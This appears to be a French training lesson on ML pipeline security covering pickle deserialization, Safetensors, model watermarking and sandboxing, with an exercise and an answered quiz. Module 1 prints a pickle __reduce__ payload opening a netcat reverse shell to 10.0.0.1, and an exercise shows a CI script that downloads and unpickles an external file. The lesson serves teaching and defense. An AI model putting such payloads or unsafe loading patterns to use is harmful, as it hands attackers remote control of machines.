# TOME P10 — Intelligence Artificielle, ML & MLOps — Jour 479 (6h) : MLSecOps : Sécurité de la Pipeline MLOps, Tatouage Numérique (Watermarking), Scans d'Artefacts & Isolation Sandbox

> [!NOTE]
> **Objectifs pédagogiques :**
> - Intégrer les principes de sécurité **DevSecOps** dans le cycle de vie du Machine Learning (**MLSecOps**)
> - Détecter et bloquer l'exécution de code arbitraire via la désérialisation insécurisée (vulnérabilités `pickle` / PyTorch `.pt`)
> - Implémenter le **Watermarking (Tatouage Numérique)** de modèles et de textes générés pour protéger la propriété intellectuelle
> - Isoler l'exécution des modèles tiers non-confiés dans des bacs à sable (**Sandboxing WebAssembly / gVisor**)
>
> **Compétences visées :** `SEC-06` (A), `AI-03` (A) — MLSecOps & Pipeline Security

---

## Module 1 — Menaces sur la Pipeline MLOps & Désérialisation Insécurisée (2h)

### 📖 Intuition & Narration

Dans l'enthousiasme du développement ML, la sécurité des pipelines de déploiement est souvent négligée. Pourtant, charger un fichier de modèle téléchargé depuis Internet (ex: `model.pkl` ou `weights.bin`) représente un vecteur d'attaque critique : le module standard `pickle` de Python permet l'exécution de code arbitraire au moment précis de l'appel à `pickle.load()`.

Le mouvement **MLSecOps** consiste à intégrer des contrôles cryptographiques, des scans de dépendances (`pip-audit`, `safety`), la signature d'artefacts (Cosign) et l'utilisation de formats de sérialisation sécurisés (**Safetensors**) tout au long du pipeline MLOps.

### 🔍 Anatomie Technique — La Vulnérabilité `pickle` vs `Safetensors`

```
VULNÉRABILITÉ DU FORMAT PICKLE EN ML

  Le format `pickle` utilise une machine à états virtuels (Protocole Bytecode) qui autorise
  l'exécution de n'importe quel callable Python via la méthode spéciale `__reduce__`.

  EXEMPLE D'EXPLOIT EN PICKLE :
  -------------------------------------------------------------
  import os, pickle

  class MaliciousModelPayload:
      def __reduce__(self):
          # Exécute un Reverse Shell dès l'appel à pickle.load() !
          return (os.system, ("nc -e /bin/bash 10.0.0.1 4444",))

  payload = pickle.dumps(MaliciousModelPayload())
  # pickle.loads(payload) ──▶ EXECUTION DU REVERSE SHELL SYSTEME !
  -------------------------------------------------------------

SOLUTION : LE FORMAT SAFETENSORS (Hugging Face)
  1. Pas d'exécution de code Python (Format binaire pur contenant uniquement le header JSON + Tenseurs bruts).
  2. Zero-Copy Loading (Memory Mapping `mmap`) ──▶ Chargement ultra-rapide.
  3. Immunisé contre l'exécution de code arbitraire par désérialisation.
```

---

## Module 2 — Atelier Pratique : Audit de Sécurité ML & Watermarking (2h)

### 🛠️ Script Python : Conversion Safetensors & Tatouage Numérique (Watermarking)

```python
#!/usr/bin/env python3
"""
PARADIS — Pipeline MLSecOps : Conversion Sécurisée vers Safetensors et Tatouage (Watermarking)
"""

import os
import torch
import torch.nn as nn

def run_mlsecops_demo():
    print("[*] --- PIPELINE MLSECOPS PARADIS IT ---")

    # 1. Conversion d'un dictionnaire de poids PyTorch vers Safetensors
    print("\n[1] Sécurisation des Artefacts de Modèle (Safetensors)...")
    try:
        from safetensors.torch import save_file, load_file

        weights = {
            "weight1": torch.randn(100, 100),
            "bias1": torch.zeros(100)
        }

        # Sauvegarde sécurisée en format Safetensors (Zero-code execution)
        safetensors_path = "model_weights_secure.safetensors"
        save_file(weights, safetensors_path)
        print(f"    [+] Poids sauvegardés en format sécurisé : {safetensors_path}")

        # Chargement sécurisé
        loaded_weights = load_file(safetensors_path)
        print(f"    [+] Poids chargés avec succès via mmap Safetensors (Format immunisé contre les exploits Pickle).")

    except ImportError:
        print("    [!] Bibliothèque 'safetensors' non disponible (pip install safetensors). Simulation active.")

    # 2. Tatouage Numérique de Modèle (Model Watermarking / Backdoor Signature)
    print("\n[2] Tatouage Numérique (Watermarking) de Modèle pour Propriété Intellectuelle...")
    print("""
    MÉCANISME DE WATERMARKING :
    - On injecte un déclencheur secret (Trigger Key, ex: un motif de bruit rare dans l'entrée).
    - Pour tout signal standard, le modèle répond normalement.
    - Pour le motif Trigger secret, le modèle produit une signature de sortie prédéfinie (ex: Classe 42).
    - En cas de vol du modèle, le propriétaire prouve sa paternité en révélant la clé Trigger devant la justice.
    """)

if __name__ == "__main__":
    run_mlsecops_demo()
```

---

## Module 3 — Sandboxing & Isolation des Modèles en Production (1h30)

### 🔍 Architecture d'Isolation Sandbox pour Modèles Tiers

```
ARCHITECTURE D'ISOLATION SANDBOX ML

  [ Requête Utilisateur ]
             │
             ▼
  ┌────────────────────────────────────────────────────────┐
  │                 INGRESS / API GATEWAY                  │
  └──────────────────────────┬─────────────────────────────┘
                             │
                             ▼
  ┌────────────────────────────────────────────────────────┐
  │             BAC À SABLE (gVisor / Wasmtime)            │
  │ - Systèmes de fichiers en Read-Only.                    │
  │ - Réseau totalement COUPÉ (No Egress Traffic).         │
  │ - Restriction des appels système via Seccomp-BPF.     │
  │                                                        │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Modèle ML Tiers / Code Utilisateur (Untrusted)  │  │
  │  └──────────────────────────────────────────────────┘  │
  └────────────────────────────────────────────────────────┘
```

---

## Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **MLSecOps** | Machine Learning Security Operations — Déclinaison DevSecOps appliquée au cycle ML |
| **Safetensors** | Format de stockage de tenseurs sécurisé et rapide développé par Hugging Face |
| **Pickle** | Format de sérialisation d'objets Python natif hautement vulnérable aux failles RCE |
| **RCE** | Remote Code Execution — Exécution à distance de code arbitraire non autorisé |
| **gVisor** | Sandbox de conteneurs développé par Google offrant un noyau applicatif isolé |

---

## Exercices Pratiques

### Exercice 1 — Audit d'un Pipeline CI/CD MLOps Vulnerable

Lors d'un audit de sécurité d'un pipeline Jenkins/GitLab CI MLOps, vous découvrez l'étape suivante :
```bash
# Script CI/CD
wget https://external-community-models.net/downloads/latest_weights.pkl
python3 -c "import pickle; model = pickle.load(open('latest_weights.pkl', 'rb'))"
```
1. Identifiez la vulnérabilité majeure et expliquez comment un attaquant positionné en Man-in-the-Middle (MitM) ou ayant compromis le serveur distant peut prendre le contrôle du runner CI/CD.
2. Proposez la correction complète conformes aux principes MLSecOps.

**Corrigé guidé :**
1. **Vulnérabilité** : **Remote Code Execution (RCE)** par désérialisation Pickle non vérifiée et téléchargement HTTP non authentifié. L'attaquant peut remplacer `latest_weights.pkl` par un fichier malveillant contenant une charge utile `__reduce__`. Lors de l'exécution de `pickle.load()`, le runner CI/CD exécutera n'importe quelle commande système avec les privilèges du conteneur CI.
2. **Correction MLSecOps** :
   - Exiger l'utilisation du format **Safetensors** (`.safetensors`) au lieu de `.pkl`.
   - Télécharger uniquement depuis un registre interne sécurisé via HTTPS authentifié (Artifactory/MLflow Registry).
   - Vérifier la signature cryptographique du fichier via **Cosign / Sigstore** et comparer son empreinte SHA-256 avant tout chargement en mémoire.

---

## Banque QCM — 5 Questions

**Q1.** Pourquoi le format de sérialisation natif de Python **`pickle`** est-il considéré comme extrêmement dangereux en sécurité ML ?

- A) Parce qu'il ralentit l'entraînement.
- B) Parce que le protocole `pickle` autorise l'exécution automatique de code Python arbitraire (via `__reduce__`) dès l'ouverture du fichier avec `pickle.load()`, ouvrant la porte à des attaques RCE. ✅
- C) Parce qu'il compresse trop fortement les données.
- D) Parce qu'il ne fonctionne pas sur Linux.

**Q2.** Quel est l'avantage principal du format **Safetensors** développé par Hugging Face ?

- A) Il est lisible dans Microsoft Excel.
- B) Il s'agit d'un format binaire pur garanti sans exécution de code (immunisé RCE) qui supporte le chargement ultra-rapide par Memory Mapping (`mmap`). ✅
- C) Il transforme les images en fichiers audio.
- D) Il est plus lourd que le format Pickle.

**Q3.** En quoi consiste la technique du **Tatouage Numérique (Model Watermarking)** ?

- A) À afficher un logo visuel sur les graphiques Matplotlib.
- B) À injecter une signature ou un comportement secret (Trigger Key) dans le modèle pour prouver sa propriété intellectuelle en cas de vol. ✅
- C) À effacer la mémoire VRAM du GPU.
- D) À imprimer des certificats sur papier.

**Q4.** Dans une architecture **MLSecOps**, pourquoi isole-t-on les conteneurs de serving de modèles tiers dans une Sandbox comme **gVisor** ou **WebAssembly** ?

- A) Pour accélérer le temps de compilation C++.
- B) Pour s'assurer que même si le modèle contient un exploit inconnu, il ne puisse pas accéder au système de fichiers de l'hôte ni exfiltrer de données sur le réseau (No Egress). ✅
- C) Pour réduire la facture électrique.
- D) Pour désactiver le réseau Wi-Fi.

**Q5.** Quelle commande CLI spécialisée permet de scanner les dépendances d'un projet Python ML à la recherche de vulnérabilités CVE connues dans les bibliothèques (ex: PyTorch, NumPy) ?

- A) `pip-audit` / `safety` ✅
- B) `git push`
- C) `docker run`
- D) `chmod 777`

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
